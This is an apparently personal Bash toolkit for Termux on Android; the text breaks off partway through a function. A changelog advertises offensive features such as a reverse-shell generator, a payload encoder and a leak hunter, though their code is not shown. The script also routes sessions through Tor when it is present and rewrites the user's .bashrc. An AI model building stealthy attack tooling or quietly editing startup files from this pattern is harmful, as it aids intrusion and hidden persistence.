#!/bin/bash

# ═══════════════════════════════════════════════════════════════════
#   FEZZY PORTALS  V61  —  30 PORTALS · FEZZY BOOT · PORTAL SYNOPSIS · SKIP-HEALTHY
#   Grant Fezzy Festers  ·  philfesters  ·  Strategy Over Impulse
#   Ravensmead  ·  Cape Town  ·  GFY-LX2P  ·  Android 14  ·  999
# ───────────────────────────────────────────────────────────────────
#   NEW IN V57 ULTRA ENHANCED (Music Player Revolution):
#     • Local Music Player [30] — COMPLETELY REBUILT FOR MAXIMUM FEATURES
#         🎵 Waveform Visualization — ffmpeg generates visual waveforms (640x120px)
#         🎨 Album Art Extraction — extracts embedded art, displays as ASCII or opens
#         📊 Enhanced Metadata — full tags: artist, title, album, genre, year, composer,
#             comment, track#, disc#, encoder, bitrate, duration, sample rate, channels, codec
#         🐕 Bojack Dark Wisdom — random quotes when playing to lift your spirits
#         📦 Organized Display — beautiful boxed metadata layout (cyan theme)
#         ⚡ New Options — [W] View waveform · [A] View album art (extract & open)
#         🎯 Auto-detection — uses artist/title from tags for lyrics fetch
#         💎 Works in Browse [3] and Search [4] modes with full feature parity
#     • Requirements: ffmpeg (waveforms + art), optional: img2txt/jp2a (ASCII art)
#     • Install: pkg install ffmpeg libcaca (for img2txt) -OR- pkg install jp2a
# ───────────────────────────────────────────────────────────────────
#   NEW IN V57 ENHANCED (The Full Arsenal):
#     • Hacker Portal [11] — 12 NEW ADVANCED TOOLS (total: 48 tools)
#         [37] CVE Search · [38] Reverse Shell Gen · [39] Payload Encoder
#         [40] XSS Scanner · [41] SSL/TLS Auditor · [42] Subdomain Takeover
#         [43] GitHub Dorking · [44] Pastebin Leak Hunter · [45] Port Knock
#         [46] DNS Zone Transfer · [47] Live Packet Sniffer · [48] Auto-Recon Chain
#     • Video Portal [3] — 6 NEW ADVANCED VIDEO TOOLS (total: 18 tools)
#         [13] Format Converter (MP4/MKV/AVI/WEBM) · [14] Subtitle Downloader
#         [15] Video Trimmer (by timestamp) · [16] Compress Video (quality presets)
#         [17] Extract Audio (MP3/M4A/OGG) · [18] Merge Videos (quick + advanced)
#     • PDF Portal [12] — 4 NEW ADVANCED PDF TOOLS (total: 17 tools)
#         [14] Password Protect (encrypt) · [15] Remove Password (decrypt)
#         [16] Add Watermark (text overlay) · [17] PDF Repair (fix corrupted)
#     • All layout, theme, colors, dividers, ASCII preserved — pure enhancement mode
#     • Total new tools added: 22 power options across 3 major portals
# ───────────────────────────────────────────────────────────────────
#   NEW IN V1 ENHANCED:
#     • _mp_browse — full ffprobe metadata display before/during playback
#         Post-play nav menu: Next · Prev · Replay · Lyrics · Track Info · Menu · Quit
#     • Local Music Player [15] Queue Builder — pick tracks by number → play in order
#         MPV key guide shown on main menu
#     • Fezzy Artist Portal [9] — Lyric Notepad rebuilt as full portal
#         New · View · Edit (append/overwrite) · Search · Delete · Export All · Vim open
#     • Termux Encyclopedia — 5 new categories (total 17):
#         Vim Editor · Tmux Multiplexer · Bash Scripting · SSH & SCP · FOSS Apps Guide
#     • All version references → Fezzy Portals v1 Enhanced
#     • Boot glitch line → FEZZY PORTALS V1 ENHANCED
#     • /tmp/fezzy_* paths fixed → ${TMPDIR:-/tmp}/fezzy_* (Android rootless safe)
# ───────────────────────────────────────────────────────────────────
#   NEW IN V2 (The Expansion):
#     • Hacker Portal boot — HACKER block ASCII art (C21 neon coral) + no-trace stamp
#     • Music Portal — 5 new options [11-15]: AudioMack · spotdl · lyrics dl · bitrate check · ffmpeg convert
#     • Torrent Portal — 3 new options [6-8]: magnet paste · eBook search · vault manager
#     • Notepad Portal — 4 new options [9-12]: search notes · export sdcard · word count · note viewer
#     • Gallery Portal — 2 new options [15-16]: Flickr pull · DeviantArt gallery
#     • 4 synopses updated to Lil Uzi street style: Note Editor · Research · Torrent · Android Bridge
# ───────────────────────────────────────────────────────────────────
#   NEW IN V1 (restart — The Rebuild):
#     • Portal [21] Fezzy Hacker Portal — dedicated personal security lab
#         5 categories: Recon · Web Exploit · Network · OSINT Advanced · Post Exploit
#         Nikto web server scanner in Web Exploitation with full how-to-use menu
#         Categories pre-loaded and ready for tools as the arsenal grows
#         Color: Strobe coral · _dv21 divider · hover hints · finish stamp
#     • Boot sequence updated to V1 — loading all 30 portals
#     • All 30 portals locked in on countdown
# ───────────────────────────────────────────────────────────────────
#   NEW IN V70:
#     • Radio section replaced with Civic/Gov portal (SASSA, SAPS, DHA, Legal Aid)
#         Streams play immediately · no false HTTP errors
#     • News Portal [34] Single Article → PDF (Google News SA RSS)
#         Pick headline · resolve redirect · wkhtmltopdf/weasyprint/txt fallback
#     • News Portal [35] Bulk Top 10 → PDF (Google News SA RSS)
#         All 10 headlines saved as individual PDFs in fezzy_news/
#     • Hacker Portal [T] drop to Termux shell for manual installs
#         Type exit to return · Did you know Note Editor hint added
#     • Shortcut Manager [9] set all 20 portal aliases at once
#         Writes to ~/.bashrc · run source ~/.bashrc to activate
#     • Cookies — replaced hardcoded ~/cookies.txt with $COOKIES_FILE variable
#         Set COOKIES_FILE in env to use your local cookies path
# ───────────────────────────────────────────────────────────────────
#   NEW IN V70 (prev V66):
#     • Boot spinner — all 20 entries now show full Portal names
#         "Gallery Portal", "Music Portal" etc. · wider padding
# ───────────────────────────────────────────────────────────────────
#   NEW IN V65:
#     • Bojack Vault Unlock boot sequence — FASTER (~2sec vs 6sec)
#         Vault combination → 999 entry → tail unlock → master bar
#         Random dark humor quote after load
#         Yellow info box removed — Install Hub in Tools Portal [6]
# ───────────────────────────────────────────────────────────────────
#   NEW IN V63:
#     • Install Hub moved into Tools Portal [6] → option [12]
#         Cleaner structure — no separate boot function
#         Boot [I] routes directly to Tools Portal
#     • octal date error fixed — 08/09 hour no longer crashes
# ───────────────────────────────────────────────────────────────────
#   NEW IN V62 (previous):
#     • Self-updating .bashrc — script rewrites its own source line
#         Deletes ALL old fezzy_station lines on every deploy
#         Writes one clean current line — no more version conflicts
#     • Info banner at boot changed to yellow — cleaner, readable
# ───────────────────────────────────────────────────────────────────
#   NEW IN V61:
#     • Install Hub [I] added to boot screen
#         9 tools selectable · Install All option
#         Loops back after each install · [m]/[b]/[q] nav
#     • Yellow info banner at boot — lists required tools before entry
#     • News Portal — article open rebuilt (termux-first)
#         [V] View in w3m / curl+less inside Termux
#         [D] Download as PDF or TXT to ~/storage/downloads/fezzy_news
#         [B] Browser demoted to optional last choice
#     • cookies.txt removed — safe to push to GitHub
# ───────────────────────────────────────────────────────────────────
#   NEW IN V58:
#     • News Portal [20] — Google News SA RSS added [30]
#         Live SA headlines via Google News RSS feed
#     • News Portal [20] — Google News Cape Town added [31]
#         Filtered Cape Town results via Google RSS search
#     • Daily Newspaper PDF [28] — fully rebuilt
#         Newspaper-style layout · white background · serif font
#         Google News SA as primary source (10 articles)
#         Pulls News24 · Google News SA · GroundUp · Daily Voice · EWN
#         Resolves Google redirect links to real article URLs
#         Auto-installs wkhtmltopdf if missing
#         Saves to ~/news_paper/daily_news.pdf + archive copy
#         Falls back to weasyprint if wkhtmltopdf fails
#     • All Sources Sweep [8] — Google News SA added first
#     • TXT Snapshot [27] — Google News SA section added
# ───────────────────────────────────────────────────────────────────
#   NEW IN V57 (previous):
#     • Shortcut Manager [S] added to Fezzy Security
#         View · Add · Edit · Delete · Capture last cmd
#         Copy .bashrc to phone · Apply shortcuts live
#     • Fezzy Studio [11] added to Fezzy Security
#         Termux Desktop · SMWYG · Mr.Holmes · Root toolkit
#         Full synopsis · launch · how-to for each tool
#     • Android permanent notification builder (Android Bridge)
#         Battery charging · WiFi disconnect · Custom schedule
#         Create + persist with termux-notification --ongoing
# ───────────────────────────────────────────────────────────────────
#   NEW IN V53:
#     • Adult Portal [9] replaced with Smart File Organizer
#         Auto-sort · Date group · Bulk rename · Duplicate finder
#         Empty cleaner · Screenshot detector · EXIF extraction
#         OCR text from images · Image similarity · Conflict resolver
#         Preview before move · rootless Android optimised
#   NEW IN V52:
#     • Android Bridge [14] — 10 Notification Types:
#         Basic · Big Text · Heads-Up · Silent · Ongoing
#         Scheduled · Download Complete · Battery Alert
#         Custom Sound · Fezzy Station SOI Alert
#     • Android Bridge [14] — New Automation:
#         Auto-Brightness by time · Screen Timeout setter
#         Do Not Disturb toggle · Scheduled SMS sender
#         WiFi Scan (nearby networks) · App List (installed)
#         Clipboard History Dump · Screenshot · Sensor Reader
# ───────────────────────────────────────────────────────────────────
#   NEW IN V50:
#     • Research Portal [18] replaces Fezzy Security Portal
#     • Wikipedia full article text (fixed API endpoint)
#     • DuckDuckGo instant answers · OpenLibrary books
#     • SearXNG meta-search (Google/Bing/Yahoo, no key)
#     • Serper.dev real Google results (free API key)
#     • Country Info · Dictionary · Multi-Search → one .txt
#     • Saves all research to ~/storage/downloads/research/
#   NEW IN V48:
#     • Write & Save — .txt/.md/.sh with copy-to-sdcard option in Docs + PDF
#     • Quick PDF Annotator — text overlay on any page via Python/reportlab
#     • Portable Bookmark Manager — save URLs + tags, search, termux-open-url
#     • Metadata Stripper Batch — all images/videos/audio in any chosen folder
#     • Clipboard Templates — pre-built snippets, one-press Android copy
#     • Download Scheduler — at/cron queue with termux-wake-lock
#     • One-Press Shortcuts — last file path, battery ping, tmux session, VPN
#     • Encryption Vault — GPG + OpenSSL encrypt/decrypt/shred
#     • Auto-Tagging — auto-move downloads into /music /videos /docs /images
#   SYNTAX FIXED:
#     • Removed duplicate _write_document function
#     • Fixed main portal case 16 duplicate collision
#     • Fixed Documents portal case 15/16 ordering (Markdown + Write correct)
#     • Fixed PDF portal duplicate [11] menu line
#     • Android Bridge [14] — termux-api hub: SMS, calls, camera, location
#     • Download Manager [15] — aria2c queue, pause/resume, multi-thread
#     • Clipboard Manager [16] — history, categories, search, paste shortcuts
#     • Notifications Hub [17] — system alerts, portal updates, download alerts
#     • Bojack Mood Meter — battery-based personality responses
#     • K9 Security Report — fake scan with Bojack commentary
#     • Gallery → Instagram/Pinterest bulk, auto-organize by source
#     • Video → cookies manager, format presets (4K/1080p/720p/audio)
#     • Social → Twitter archiver, Reddit saver, thread unroller
#     • Hacker → Shodan-CLI, Amass, subfinder added
#     • Documents → EPUB reader, text-to-speech
# ───────────────────────────────────────────────────────────────────
#   PORTALS:
#     [1]  Gallery     [2]  Music      [3]  Video     [4]  Web Grab
#     [5]  Search      [6]  Tools      [7]  Juice WRLD [8] Social
#     [9]  File Org    [10] Books      [11] Hacker    [12] PDF
#     [13] Documents   [14] Android    [15] Downloads  [16] Clipboard
#     [17] Notifications [18] Research  [19] GitHub    [20] News Portal
#     [21] Fezzy Hacker Portal          [22] Encryption Portal
#     [23] Torrent Portal               [24] Termux Desktop Portal
#     [25] File Manager Portal          [26] Shortcut Builder Portal
#     [27] FOSS App Discovery           [28] Termux Encyclopedia
#     [29] Fezzy Artist Portal           [30] Local Music Player
# ═══════════════════════════════════════════════════════════════════

#  PALETTE 
PINK='\033[38;5;213m'
HOT='\033[38;5;199m'
PU='\033[38;5;129m'
PU2='\033[38;5;93m'
CY='\033[38;5;51m'
BLUE='\033[38;5;39m'
ROSE='\033[38;5;211m'
GRN='\033[38;5;46m'
RED='\033[38;5;196m'
MAG='\033[38;5;201m'
YEL='\033[38;5;226m'
ORG='\033[38;5;208m'
WH='\033[97m'
FADE='\033[38;5;238m'
DIM='\033[38;5;240m'
BOLD='\033[1m'
RESET='\033[0m'

#  PORTAL COLOURS — unique neon per portal 
C1="${HOT}"       # Gallery    — electric hot pink
C2="${PINK}"      # Music      — neon pink
C3="${CY}"        # Video      — electric cyan
C4="${GRN}"       # Web Grab   — electric green
C5="${YEL}"       # Search     — electric yellow
C6="${MAG}"       # Tools      — electric magenta
C7="${YEL}"       # Juice WRLD — gold 999
C8="${BLUE}"      # Social     — electric blue
C9="${RED}"       # File Org   — electric red
C10="${YEL}"      # Books      — gold
C11="${PU}"       # Hacker     — purple
C12="${ORG}"      # PDF        — electric orange
C13="${ROSE}"     # Documents  — rose
C14="${CY}"       # Android    — teal cyan
C15="${GRN}"      # Downloads  — electric green
C16="${MAG}"      # Clipboard  — magenta
C17="${ORG}"      # Notifs     — orange
LIME='\033[38;5;82m'
C18="${LIME}"      # Research  — lime green
TEAL='\033[38;5;45m'
C19="${TEAL}"      # GitHub     — teal
CRIMSON='\033[38;5;160m'
C20="${CRIMSON}"   # Fezzy Sec  — crimson red
STROBE='\033[38;5;204m'
C21="${STROBE}"    # Exploitation Portal — neon coral
GOLD='\033[38;5;220m'
C22="${GOLD}"      # Encryption   — gold

# ── PROXY AUTO-DETECT — wraps session when Tor + ProxyChains are live ──
FEZZY_PROXY_CMD=""
FEZZY_PROXY_ACTIVE=0
_proxy_setup() {
    local pc=""
    command -v proxychains4 &>/dev/null && pc="proxychains4 -q"
    [[ -z "$pc" ]] && command -v proxychains &>/dev/null && pc="proxychains -q"
    if [[ -n "$pc" ]] && pgrep -x tor &>/dev/null 2>/dev/null; then
        FEZZY_PROXY_CMD="$pc"
        FEZZY_PROXY_ACTIVE=1
    fi
}
_proxy_setup

COLS=$(tput cols 2>/dev/null || echo 88)
export PS1="\[\033[38;5;213m\]\[\033[1m\]Bojack Fezzy Vert\[\033[0m\] \$ "

DLDIR=~/storage/downloads
GALDIR=~/storage/downloads/gallery
SOCIALDIR=~/storage/downloads/social
PDFDIR=~/storage/downloads/pdfs
DOCDIR=~/storage/downloads/documents
DLQDIR=~/storage/downloads/dlqueue
CLIPDIR=~/.fezzy_clipboard
SECDIR=~/storage/downloads/security_reports
HACKDIR=~/storage/downloads/hacker_reports
MUSICDIR=~/storage/downloads/music
VIDDIR=~/storage/downloads/videos
WATCH_DIR="/sdcard/Download"
GITDIR=~/storage/downloads/github_repos
FSECDIR=~/storage/downloads/fezzy_security
NEWSDIR=~/storage/downloads/fezzy_news
RESDIR=~/storage/downloads/research
SHORTCUTSFILE=~/.fezzy_shortcuts
STUDIODIR=~/storage/downloads/fezzy_studio
mkdir -p "$DLDIR" "$GALDIR" "$SOCIALDIR" "$PDFDIR" "$DOCDIR" "$DLQDIR" "$CLIPDIR" "$SECDIR" "$HACKDIR" "$MUSICDIR" "$VIDDIR" "$GITDIR" "$FSECDIR" "$RESDIR" "$STUDIODIR" ~/storage/downloads/books ~/storage/downloads/private ~/storage/downloads/webgrab 2>/dev/null

# ── SELF-UPDATING .bashrc — always points to this file ──────────
SELF="$(realpath "${BASH_SOURCE[0]}" 2>/dev/null || echo "$HOME/fezzy_station_v61.sh")"
grep -qF "$SELF" ~/.bashrc 2>/dev/null || { sed -i '/fezzy_station/d' ~/.bashrc 2>/dev/null; echo "source $SELF" >> ~/.bashrc; }
# cookies.txt — manage locally, never commit to GitHub
# Set COOKIES_FILE to your local cookies path if you have one
COOKIES_FILE="${COOKIES_FILE:-$HOME/cookies.txt}"

# ─── PATH EXPAND HELPER ───────────────────────────────────────────
_xpath() { echo "${1/#\~/$HOME}"; }

# ─── PDF PICKER — auto-scan PDFDIR + WATCH_DIR, numbered select ──
# Usage: local pdf; pdf=$(_pdf_picker) && [[ -z "$pdf" ]] && continue
_pdf_picker() {
    local C12_L="${C12}" RESET_L="${RESET}" WH_L="${WH}" FADE_L="${FADE}" GRN_L="${GRN}" RED_L="${RED}"
    mapfile -t found_pdfs < <(
        find "$PDFDIR" -maxdepth 2 -name "*.pdf" -type f 2>/dev/null
        find "$WATCH_DIR" -maxdepth 1 -name "*.pdf" 2>/dev/null
    )
    # deduplicate by basename
    declare -A seen_bases
    local deduped=()
    for f in "${found_pdfs[@]}"; do
        local b; b=$(basename "$f")
        if [[ -z "${seen_bases[$b]}" ]]; then
            seen_bases[$b]=1
            deduped+=("$f")
        fi
    done 2>/dev/null
    if [[ ${#deduped[@]} -eq 0 ]]; then
        printf "  ${RED_L}No PDFs found in %s or %s${RESET_L}\n" "$PDFDIR" "$WATCH_DIR" >&2
        printf "  ${FADE_L}Drop a PDF into %s or run [10] to install tools${RESET_L}\n" "$WATCH_DIR" >&2
        echo ""; return 1
    fi
    printf "\n  ${C12_L}[AUTO-DETECT]${RESET_L} ${WH_L}%s PDF(s) found:${RESET_L}\n\n" "${#deduped[@]}" >&2
    local i=1
    for f in "${deduped[@]}"; do
        local loc="vault"
        [[ "$f" == "$WATCH_DIR"* ]] && loc="drop zone"
        printf "  ${C12_L}%2d.${RESET_L} %-50s ${FADE_L}[%s]${RESET_L}\n" "$i" "$(basename "$f")" "$loc" >&2
        ((i++))
    done 2>/dev/null
    printf "\n  ${WH_L}Number: ${RESET_L}" >&2
    read -r num
    local idx=$(( num - 1 ))
    local picked="${deduped[$idx]}"
    if [[ -z "$picked" || ! -f "$picked" ]]; then
        printf "  ${RED_L}Invalid selection${RESET_L}\n" >&2
        echo ""; return 1
    fi
    echo "$picked"
}

# ─── DOCS AUTO-SCAN — detect new PDFs in WATCH_DIR not yet in vault ─
_docs_autoscan() {
    local new_pdfs=()
    while IFS= read -r -d '' f; do
        local base; base=$(basename "$f")
        [[ ! -f "$DOCDIR/$base" ]] && new_pdfs+=("$f")
    done < <(find "$WATCH_DIR" -maxdepth 1 -name "*.pdf" -print0 2>/dev/null)
    [[ ${#new_pdfs[@]} -eq 0 ]] && return
    echo ""
    printf "  ${C13}[AUTO-DETECT]${RESET} ${WH}Found %s new PDF(s) in %s:${RESET}\n\n" "${#new_pdfs[@]}" "$WATCH_DIR"
    local i=1
    for f in "${new_pdfs[@]}"; do
        printf "  ${C13}%2d.${RESET} %s\n" "$i" "$(basename "$f")"
        ((i++))
    done 2>/dev/null
    echo ""
    printf "  ${WH}Import all? [y/n/pick]: ${RESET}"; read -r ans
    case "$ans" in
        y|Y)
            for f in "${new_pdfs[@]}"; do
                cp "$f" "$DOCDIR/" && printf "  ${GRN}✓${RESET} Imported: %s\n" "$(basename "$f")"
            done ;;
        pick|p|P)
            printf "  ${WH}Enter numbers to import (e.g. 1 3 5): ${RESET}"; read -r nums
            for n in $nums; do
                local idx=$(( n - 1 ))
                local f="${new_pdfs[$idx]}"
                [[ -f "$f" ]] && cp "$f" "$DOCDIR/" && printf "  ${GRN}✓${RESET} Imported: %s\n" "$(basename "$f")"
            done ;;
        *) printf "  ${FADE}Skipped auto-import${RESET}\n" ;;
    esac
    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
}

# ─── GALLERY AUTO-SCAN — show new downloads in GALDIR on open ────
_gallery_autoscan() {
    local count; count=$(find "$GALDIR" -type f 2>/dev/null | wc -l)
    [[ "$count" -eq 0 ]] && return
    local latest; latest=$(find "$GALDIR" -type f -newer "$GALDIR" 2>/dev/null | wc -l)
    printf "  ${C1}[GALLERY]${RESET} ${WH}%s file(s) in vault" "$count"
    [[ "$latest" -gt 0 ]] && printf "  ·  ${GRN}%s new since last session${RESET}" "$latest"
    printf "${RESET}\n"
    # show subfolders with counts
    local subs=(); mapfile -t subs < <(find "$GALDIR" -mindepth 1 -maxdepth 1 -type d 2>/dev/null)
    if [[ ${#subs[@]} -gt 0 ]]; then
        for s in "${subs[@]}"; do
            local n; n=$(find "$s" -type f 2>/dev/null | wc -l)
            printf "  ${FADE}  └ %-20s %s file(s)${RESET}\n" "$(basename "$s")" "$n"
        done 2>/dev/null
    fi
    echo ""
}

# ─── SOCIAL AUTO-SCAN — show saved reports/fetches on open ───────
_social_autoscan() {
    local count; count=$(find "$SOCIALDIR" -type f 2>/dev/null | wc -l)
    [[ "$count" -eq 0 ]] && return
    printf "  ${C8}[SAVED]${RESET} ${WH}%s report(s)/fetch(es) in %s${RESET}\n" "$count" "$SOCIALDIR"
    # show 3 most recent
    local recent; recent=$(find "$SOCIALDIR" -type f -printf '%T@ %f\n' 2>/dev/null | sort -rn | head -3 | awk '{print $2}')
    if [[ -n "$recent" ]]; then
        printf "  ${FADE}  Recent:${RESET}\n"
        while IFS= read -r fname; do
            printf "  ${FADE}    · %s${RESET}\n" "$fname"
        done <<< "$recent"
    fi
    echo ""
}

# 
# DIVIDERS — coloured per portal
# 
_dv()     { printf "${PU}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }
_dv1()    { printf "${C1}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }
_dv2()    { printf "${C2}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }
_dv3()    { printf "${C3}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }
_dv4()    { printf "${C4}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }
_dv5()    { printf "${C5}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }
_dv6()    { printf "${C6}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }
_dv7()    { printf "${C7}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }
_dv8()    { printf "${C8}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }
_dv9()    { printf "${C9}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }
_dv11()   { printf "${C11}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }
_dv12()   { printf "${C12}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }
_dv13()   { printf "${C13}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }
_dv14()   { printf "${C14}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }
_dv15()   { printf "${C15}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }
_dv16()   { printf "${C16}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }
_dv17()   { printf "${C17}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }
_dv18()   { printf "${C18}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }
_dv19()   { printf "${C19}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }
_dv20()   { printf "${C20}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }
_dv21()   { printf "${C21}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }
_dv22()   { printf "${C22}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }
_red_bar(){ printf "${RED}"; printf "%${COLS}s" "" | tr ' ' '━'; printf "${RESET}\n"; }
_row()    { printf "  %s\n" "$1"; }
_dvf()    { printf "${HOT}"; printf "%${COLS}s" "" | tr ' ' '═'; printf "${RESET}\n"; }

#  STAR LINE — takes a colour arg 
_star() {
    local col="${1:-${PINK}}"
    printf "  ${col}✦${RESET}${FADE}────────────────────────────────────────────────────────${RESET}${col}✦${RESET}\n"
}

# 
# TYPEWRITER
# 
_tw() {
    local text="$1" color="$2" delay="${3:-0.045}"
    printf "${color}${BOLD}"
    for ((i=0; i<${#text}; i++)); do
        printf "%s" "${text:$i:1}"
        sleep "$delay"
    done 2>/dev/null
    printf "${RESET}\n"
}

# 
# PURE-BASH SPINNER — no gum required
# 
_spin() {
    local msg="$1" duration="${2:-1.2}" col="${3:-${PINK}}"
    local frames=("⠋" "⠙" "⠹" "⠸" "⠼" "⠴" "⠦" "⠧" "⠇" "⠏")
    local start now elapsed i=0
    start=$(date +%s%3N)
    local dur_ms=$(echo "$duration * 1000" | bc 2>/dev/null | cut -d. -f1)
    [[ -z "$dur_ms" || "$dur_ms" -eq 0 ]] && dur_ms=1200
    while true; do
        now=$(date +%s%3N)
        elapsed=$(( now - start ))
        [[ $elapsed -ge $dur_ms ]] && break
        printf "\r  ${col}${frames[$i]}${RESET}  ${WH}%s${RESET}   " "$msg"
        i=$(( (i+1) % 10 ))
        sleep 0.08
    done 2>/dev/null
    printf "\r  ${GRN}✓${RESET}  ${WH}%s${RESET}            \n" "$msg"
}

# 
# PURE-BASH LOADING BAR
# 
_bar() {
    local label="${1:-LOADING}" total="${2:-30}" speed="${3:-0.011}"
    printf "  ${PINK}%-14s${RESET}  ${FADE}[${RESET}" "$label"
    for ((i=0; i<total; i++)); do
        printf "${GRN}█${RESET}"
        sleep "$speed"
    done 2>/dev/null
    printf "${FADE}]${RESET}  ${GRN}DONE${RESET}\n"
}


# 
# SOI QUOTES
# 
_soi_quote() {
    local quotes=(
        "Strategy Over Impulse — think before you pull."
        "The operation unseen is the operation that succeeds."
        "Know your tools. Know your targets. Know yourself."
        "Speed is nothing without precision. Precision is everything."
        "Bojack never tells. Neither does the archive."
        "999 — what goes up never comes down."
        "Move in silence. Let the downloads speak."
        "Every pull is a statement. Make it count."
        "Appear weak when strong. Appear strong when downloading."
        "The best OSINT leaves no trace of the investigator."
        "Supreme excellence is pulling before they know you were there."
        "Build your operation so quietly they never notice the archive growing."
    )
    echo "${quotes[$((RANDOM % ${#quotes[@]}))]}"
}

_uzi_quote() {
    local quotes=(
        "I been going through something for a minute but now I'm good."
        "The world is yours and I want it back."
        "I speak the truth, I'm just speaking my facts."
        "Long live my squad, I put that on everything."
        "Diamonds on my wrist, they shining on you."
        "I just want the money, fame and diamond rings."
        "Know I got that ice, yeah I'm living right."
        "All my friends are dead, push me to the edge."
        "I been going crazy, I been on my shit."
        "Everything I do I do it with the passion."
    )
    local q="${quotes[$((RANDOM % ${#quotes[@]}))]}"
    printf "  ${C21}"
    local len=${#q}
    for ((i=0; i<len; i++)); do
        printf "%s" "${q:$i:1}"; sleep 0.01
    done 2>/dev/null
    printf "${RESET}\n"
}

# 
# TIME-BASED GREETING
# 
_time_greeting() {
    local hour; hour=$(( 10#$(date +%H) ))
    if   (( hour >= 0  && hour < 5  )); then echo "Deep night mode, Fezzy"
    elif (( hour >= 5  && hour < 12 )); then echo "Morning, Fezzy"
    elif (( hour >= 12 && hour < 17 )); then echo "Afternoon, Fezzy"
    elif (( hour >= 17 && hour < 21 )); then echo "Evening, Fezzy"
    else echo "Night mode, Fezzy"
    fi
}

# 
# GLITCH EFFECT — corrupts text then snaps to clean render
# 
_glitch_line() {
    local text="$1" color="${2:-${HOT}}"
    local glitch=("▓" "░" "▒" "▄" "▀" "■" "×" "%" "$" "#" "!")
    local len=${#text}
    for frame in 1 2 3 4; do
        printf "\r  ${color}${BOLD}"
        for ((i=0; i<len; i++)); do
            local ch="${text:$i:1}"
            if [[ "$ch" == " " ]]; then printf " "
            elif (( RANDOM % 3 == 0 )); then printf "%s" "${glitch[$((RANDOM % ${#glitch[@]}))]}"
            else printf "%s" "$ch"; fi
        done
        printf "${RESET}"; sleep 0.12
    done 2>/dev/null
    printf "\r  ${color}${BOLD}%-${len}s${RESET}\n" "$text"
}

# 
# DECIPHER EFFECT — scrambles then decodes char by char
# 
_decipher_line() {
    local text="$1" color="${2:-${CY}}"
    local charset="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%&"
    local len=${#text} clen=${#charset}
    for pass in 1 2 3; do
        printf "\r  ${color}"
        for ((i=0; i<len; i++)); do
            local ch="${text:$i:1}"
            if [[ "$ch" == " " || $pass -eq 3 ]]; then printf "%s" "$ch"
            else printf "%s" "${charset:$((RANDOM % clen)):1}"; fi
        done
        printf "${RESET}"; sleep 0.10
    done 2>/dev/null
    printf "\r  ${color}%-${len}s${RESET}\n" "$text"
}

# ── PULSE BAR — breathes in and out ──────────────────────────────
_pulse_bar() {
    local label="${1:-LOADING}" col="${2:-${PINK}}"
    local width=28
    for pass in 1 2; do
        for ((i=0; i<=width; i++)); do
            printf "\r  ${col}%-14s${RESET}  ${FADE}[${RESET}${GRN}%*s%*s${FADE}]${RESET}" \
                "$label" "$i" "" "$((width-i))" ""
            printf "${GRN}%s${RESET}" "$(printf '%0.s█' $(seq 1 $i) 2>/dev/null)"
            sleep 0.011
        done 2>/dev/null
        for ((i=width; i>=0; i--)); do
            printf "\r  ${col}%-14s${RESET}  ${FADE}[${RESET}${GRN}%*s%*s${FADE}]${RESET}" \
                "$label" "$i" "" "$((width-i))" ""
            sleep 0.014
        done 2>/dev/null
    done 2>/dev/null
    printf "\r  ${col}%-14s${RESET}  ${FADE}[${GRN}%s${FADE}]${RESET}  ${GRN}LOCKED${RESET}\n" \
        "$label" "$(printf '%0.s█' $(seq 1 $width) 2>/dev/null)"
}

# ── COUNTDOWN — 3..2..1..LOCKED IN ───────────────────────────────
_countdown() {
    local msg="${1:-LOCKED IN}"
    for n in 3 2 1; do
        printf "\r  ${HOT}${BOLD}%s...${RESET}  " "$n"; sleep 0.6
    done 2>/dev/null
    printf "\r  ${GRN}${BOLD}%s${RESET}               \n" "$msg"
    sleep 0.3
}

# ── FLASH — green on success, red on fail ────────────────────────
_flash_ok()   { printf "  ${GRN}${BOLD}████ DONE ████${RESET}\n"; sleep 0.15; printf "\033[1A\033[2K"; printf "  ${GRN}✓ Done${RESET}\n"; }
_flash_fail() { printf "  ${RED}${BOLD}████ FAIL ████${RESET}\n"; sleep 0.15; printf "\033[1A\033[2K"; printf "  ${RED}✗ Failed${RESET}\n"; }

# ── STAMP — bold portal-colored result block ──────────────────────
_stamp() {
    local msg="${1:-OPERATION COMPLETE}" col="${2:-${GRN}}"
    echo ""
    printf "  ${col}${BOLD}[ %s ]${RESET}\n" "$msg"
    echo ""
}

# ── FINISH MSG — unique per portal ───────────────────────────────
_finish_msg() {
    local portal="$1"
    case "$portal" in
        gallery)   _stamp "VAULT UPDATED · THEY NEVER SAW US" "${C1}" ;;
        music)     _stamp "FREQUENCY SEALED · 999" "${C2}" ;;
        video)     _stamp "LOCKED · SASUKE STEALTH · HQ SECURED" "${C3}" ;;
        webgrab)   _stamp "FROZEN · OFFLINE FOREVER · SOI" "${C4}" ;;
        search)    _stamp "RESULTS PULLED · ARCHIVE INTACT" "${C5}" ;;
